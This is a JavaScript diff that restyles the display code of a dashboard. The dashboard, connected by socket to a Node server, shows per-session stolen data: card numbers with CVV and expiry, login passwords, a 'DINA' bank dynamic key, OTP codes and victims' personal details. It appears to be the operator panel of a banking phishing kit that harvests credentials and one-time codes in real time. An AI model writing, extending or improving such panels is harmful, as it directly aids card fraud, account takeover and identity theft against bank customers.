@@ -1,7 +1,7 @@
 // =========================
 // Config / State
 // =========================
-const nodeUrl = "http://192.168.56.1:3005";
+const nodeUrl = "http://192.168.145.120:3005";
 let socket;
 let sessionsById = {};
 let selectedId = null;
@@ -387,36 +387,30 @@ function getCcIcon(s) {
 
 function sectionCc(s) {
     return `
-    <div class="history-data-label-container">
-      <span class="history-data-label">CC</span>
-    </div>
-
-    <div class="history-data">
-      <div class="cc">
-        <div class="value-container cc-holder">
-          <b class="value-label">Nombre: </b>
-          <span class="value">${escapeHtml(s.holder ?? "—")}</span>
+    <div class="section-content">
+      <div class="section-header">CC</div>
+      <div class="section-data">
+        <div class="data-row">
+          <span class="data-label">Nombre:</span>
+          <span class="data-value">${escapeHtml(s.holder ?? "—")}</span>
         </div>
-
-        <div class="value-container cc-number">
-          <b class="value-label">Tarjeta: </b>
-          <span class="value">${escapeHtml(s.cc ?? "—")}</span>
+        <div class="data-row">
+          <span class="data-label">Tarjeta:</span>
+          <span class="data-value">${escapeHtml(s.cc ?? "—")}</span>
         </div>
-
-        <div class="value-container cc-data">
-          <div class="cvv-value">
-            <span class="value cvv"><b class="value-label">Cvv: </b>${escapeHtml(s.cvv ?? "—")}</span>
+        <div class="data-row-inline">
+          <div class="data-row">
+            <span class="data-label">CVV:</span>
+            <span class="data-value">${escapeHtml(s.cvv ?? "—")}</span>
           </div>
-          <div class="exp-value">
-            <span class="value exp"><b class="value-label">Exp: </b>${escapeHtml(s.exp ?? "—")}</span>
+          <div class="data-row">
+            <span class="data-label">Exp:</span>
+            <span class="data-value">${escapeHtml(s.exp ?? "—")}</span>
           </div>
         </div>
       </div>
-
-      <div class="history-data-icon">
-        <span class="focus-icon">${getCcIcon(s)}</span>
-      </div>
     </div>
+    <div class="section-icon">${getCcIcon(s)}</div>
   `;
 }
 
@@ -436,26 +430,20 @@ function getLogoIcon(s) {
 
 function sectionLogo(s) {
     return `
-    <div class="history-data-label-container">
-      <span class="history-data-label">LOGO</span>
-    </div>
-
-    <div class="history-data">
-      <div class="logo">
-        <div class="value-container logo-user">
-          <b class="value-label">Usuario: </b>
-          <span class="value">${escapeHtml(s.user ?? "—")}</span>
+    <div class="section-content">
+      <div class="section-header">LOGO</div>
+      <div class="section-data">
+        <div class="data-row">
+          <span class="data-label">Usuario:</span>
+          <span class="data-value">${escapeHtml(s.user ?? "—")}</span>
         </div>
-        <div class="value-container logo-pass">
-          <b class="value-label">Contraseña: </b>
-          <span class="value">${escapeHtml(s.pass ?? "—")}</span>
+        <div class="data-row">
+          <span class="data-label">Contraseña:</span>
+          <span class="data-value">${escapeHtml(s.pass ?? "—")}</span>
         </div>
       </div>
-
-      <div class="history-data-icon">
-        <span class="focus-icon">${getLogoIcon(s)}</span>
-      </div>
     </div>
+    <div class="section-icon">${getLogoIcon(s)}</div>
   `;
 }
 
@@ -476,19 +464,16 @@ function getDinaIcon(s) {
 
 function sectionDina(s) {
     return `
-    <div class="history-data-label-container">
-      <span class="history-data-label">DINA</span>
-    </div>
-
-    <div class="history-data">
-      <div class="value-container">
-        <span class="dinamic-value">${escapeHtml(s.dinamic ?? "—")}</span>
-      </div>
-
-      <div class="history-data-icon">
-        <span class="focus-icon">${getDinaIcon(s)}</span>
+    <div class="section-content">
+      <div class="section-header">DINA</div>
+      <div class="section-data">
+        <div class="data-row">
+          <span class="data-label">Valor:</span>
+          <span class="data-value">${escapeHtml(s.dinamic ?? "—")}</span>
+        </div>
       </div>
     </div>
+    <div class="section-icon">${getDinaIcon(s)}</div>
   `;
 }
 
@@ -508,19 +493,16 @@ function getOtpIcon(s) {
 
 function sectionOtp(s) {
     return `
-    <div class="history-data-label-container">
-      <span class="history-data-label">OTP</span>
-    </div>
-
-    <div class="history-data">
-        <div class="value-container">
-            <span class="otp-value">${escapeHtml(s.otp ?? "—")}</span>
+    <div class="section-content">
+      <div class="section-header">OTP</div>
+      <div class="section-data">
+        <div class="data-row">
+          <span class="data-label">Código:</span>
+          <span class="data-value">${escapeHtml(s.otp ?? "—")}</span>
         </div>
-
-        <div class="history-data-icon">
-            <span class="focus-icon">${getOtpIcon(s)}</span>      
-        </div>
+      </div>
     </div>
+    <div class="section-icon">${getOtpIcon(s)}</div>
   `;
 }
 
@@ -536,23 +518,48 @@ function getDataIcon(s) {
 
 function sectionOther(s) {
     return `
-    <div class="history-data-label-container">
-      <span class="history-data-label">Información personal</span>
+    <div class="section-content">
+      <div class="section-header">Información Personal</div>
+      <div class="section-data">
+        <div class="data-row">
+          <span class="data-label">Nombre:</span>
+          <span class="data-value">${escapeHtml(s.name ?? "—")}</span>
+        </div>
+        <div class="data-row">
+          <span class="data-label">Documento:</span>
+          <span class="data-value">${escapeHtml(s.document ?? "—")}</span>
+        </div>
+        <div class="data-row">
+          <span class="data-label">Dirección:</span>
+          <span class="data-value">${escapeHtml(s.address ?? "—")}</span>
+        </div>
+        <div class="data-row">
+          <span class="data-label">Teléfono:</span>
+          <span class="data-value">${escapeHtml(s.phone ?? "—")}</span>
+        </div>
+        <div class="data-row">
+          <span class="data-label">País:</span>
+          <span class="data-value">${escapeHtml(s.country ?? "—")}</span>
+        </div>
+        <div class="data-row">
+          <span class="data-label">Ciudad:</span>
+          <span class="data-value">${escapeHtml(s.city ?? "—")}</span>
+        </div>
+        <div class="data-row">
+          <span class="data-label">Email:</span>
+          <span class="data-value">${escapeHtml(s.email ?? "—")}</span>
+        </div>
+        <div class="data-row">
+          <span class="data-label">IP:</span>
+          <span class="data-value">${escapeHtml(s.ip ?? "—")}</span>
+        </div>
+        <div class="data-row">
+          <span class="data-label">Browser:</span>
+          <span class="data-value">${escapeHtml(s.wb ?? "—")}</span>
+        </div>
+      </div>
     </div>
-    <hr style="width:100%;" />
-
-    <div class="history-data"><div class="value-container"><b class="common-label">Nombre: </b><span class="common-value">${escapeHtml(s.name ?? "—")}</span></div></div>
-    <div class="history-data"><div class="value-container"><b class="common-label">Documento: </b><span class="common-value">${escapeHtml(s.document ?? "—")}</span></div></div>
-    <div class="history-data"><div class="value-container"><b class="common-label">Dirección: </b><span class="common-value">${escapeHtml(s.address ?? "—")}</span></div></div>
-    <div class="history-data"><div class="value-container"><b class="common-label">Telefono: </b><span class="common-value">${escapeHtml(s.phone ?? "—")}</span></div></div>
-    <div class="history-data"><div class="value-container"><b class="common-label">País: </b><span class="common-value">${escapeHtml(s.country ?? "—")}</span></div></div>
-    <div class="history-data"><div class="value-container"><b class="common-label">Ciudad: </b><span class="common-value">${escapeHtml(s.city ?? "—")}</span></div></div>
-    <div class="history-data"><div class="value-container"><b class="common-label">Email: </b><span class="common-value">${escapeHtml(s.email ?? "—")}</span></div></div>
-
-    <hr style="width:100%;" />
-
-    <div class="history-data"><div class="value-container wb"><b class="common-label">IP: </b><span class="common-value">${escapeHtml(s.ip ?? "—")}</span></div></div>
-    <div class="history-data"><div class="value-container wb"><b class="common-label">WebBrowser: </b><span class="common-value">${escapeHtml(s.wb ?? "—")}</span></div></div>
+    <div class="section-icon">📋</div>
   `;
 }
 
